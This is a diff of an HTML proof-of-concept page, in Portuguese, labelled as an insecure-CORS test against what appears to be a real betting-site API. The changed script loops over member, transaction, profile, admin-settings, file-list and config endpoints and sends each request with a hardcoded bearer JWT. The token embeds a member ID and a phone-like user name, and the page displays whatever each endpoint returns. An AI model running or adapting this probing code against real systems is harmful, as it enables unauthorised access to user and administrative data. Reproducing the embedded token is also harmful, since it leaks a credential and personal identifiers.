@@ -2,34 +2,61 @@
 <html lang="pt-BR">
 <head>
 <meta charset="UTF-8" />
-<title>PoC CORS Inseguro com Bearer Token</title>
+<title>PoC CORS - Teste múltiplos endpoints</title>
+<style>
+  body { font-family: monospace; background: #f0f0f0; padding: 20px; }
+  pre { background: #222; color: #0f0; padding: 10px; border-radius: 5px; max-height: 300px; overflow-y: auto; }
+  .endpoint { margin-bottom: 20px; }
+</style>
 </head>
 <body>
-<h2>Teste CORS Inseguro - Chamada Autenticada</h2>
-<pre id="resultado">Carregando...</pre>
+<h2>Teste CORS Inseguro - Vários Endpoints</h2>
+<div id="resultados"></div>
 
 <script>
-  fetch("https://api.w1-boxingpg.bet/api/member/member/UserInfo", {
-    method: "GET",
-    headers: {
-      "accept": "*/*",
-      "content-type": "application/json",
-      "authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1laWQiOiIyMTAzNzciLCJhcmVhSWQiOiI2MCIsInN5c1JvbGUiOiI2MCIsImxlYXNlIjoiMCIsImxlYXNlTWdyIjoiMSIsIm1lbWJlck5vIjoiNTE1NzAwIiwiZ3JhZGVJZCI6Ijc1OCIsImFnZW50SWQiOiI0MzYiLCJuYW1lIjoiMzE5ODg0MjMxMjEiLCJyb2xlIjoiMCIsImNsaWVudElkIjoiOTIyOTk3NzgtMTQ1NS00MWI1LWE5OTEtYzRjOGU5NGNkYzUxIiwiY2xpZW50VHlwZSI6IkJyb3dzZXIiLCJuYmYiOjE3NTUwMDk5OTcsImV4cCI6MTc1NTA5NjM5NywiaWF0IjoxNzU1MDA5OTk3LCJpc3MiOiJraW5nNzc3NyIsImF1ZCI6Imtpbmc3Nzc3IGFwaSBjbGllbnQifQ.4ngSE4dj3Uo7hHKAYlfzfXYf8DVCkMJz3vJAW34FaGo"
-    },
-    credentials: "include"  // se precisar enviar cookies, pode manter, senão pode tirar
-  })
-  .then(response => {
-    if (!response.ok) throw new Error('Status HTTP ' + response.status);
-    return response.text();
-  })
-  .then(data => {
-    document.getElementById("resultado").textContent = data;
-    console.log("Dados recebidos:", data);
-  })
-  .catch(error => {
-    document.getElementById("resultado").textContent = "Erro: " + error;
-    console.error("Erro:", error);
-  });
+  const endpoints = [
+    "/api/member/member/UserInfo",
+    "/api/member/member/Transactions",
+    "/api/member/member/Profile",
+    "/api/admin/settings",
+    "/api/files/list",
+    "/api/docs",
+    "/api/config"
+  ];
+
+  const baseUrl = "https://api.w1-boxingpg.bet";
+
+  const token = "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1laWQiOiIyMTAzNzciLCJhcmVhSWQiOiI2MCIsInN5c1JvbGUiOiI2MCIsImxlYXNlIjoiMCIsImxlYXNlTWdyIjoiMSIsIm1lbWJlck5vIjoiNTE1NzAwIiwiZ3JhZGVJZCI6Ijc1OCIsImFnZW50SWQiOiI0MzYiLCJuYW1lIjoiMzE5ODg0MjMxMjEiLCJyb2xlIjoiMCIsImNsaWVudElkIjoiOTIyOTk3NzgtMTQ1NS00MWI1LWE5OTEtYzRjOGU5NGNkYzUxIiwiY2xpZW50VHlwZSI6IkJyb3dzZXIiLCJuYmYiOjE3NTUwMDk5OTcsImV4cCI6MTc1NTA5NjM5NywiaWF0IjoxNzU1MDA5OTk3LCJpc3MiOiJraW5nNzc3NyIsImF1ZCI6Imtpbmc3Nzc3IGFwaSBjbGllbnQifQ.4ngSE4dj3Uo7hHKAYlfzfXYf8DVCkMJz3vJAW34FaGo";
+
+  const resultadosDiv = document.getElementById("resultados");
+
+  async function testEndpoints() {
+    resultadosDiv.innerHTML = "";
+    for (const ep of endpoints) {
+      const container = document.createElement("div");
+      container.classList.add("endpoint");
+      container.innerHTML = `<h3>Endpoint: ${ep}</h3><pre>Carregando...</pre>`;
+      resultadosDiv.appendChild(container);
+
+      try {
+        const res = await fetch(baseUrl + ep, {
+          method: "GET",
+          headers: {
+            "accept": "*/*",
+            "content-type": "application/json",
+            "authorization": token
+          }
+        });
+        const text = await res.text();
+
+        container.querySelector("pre").textContent = `Status: ${res.status}\n\n${text}`;
+      } catch (e) {
+        container.querySelector("pre").textContent = `Erro: ${e.message}`;
+      }
+    }
+  }
+
+  testEndpoints();
 </script>
 
 </body>
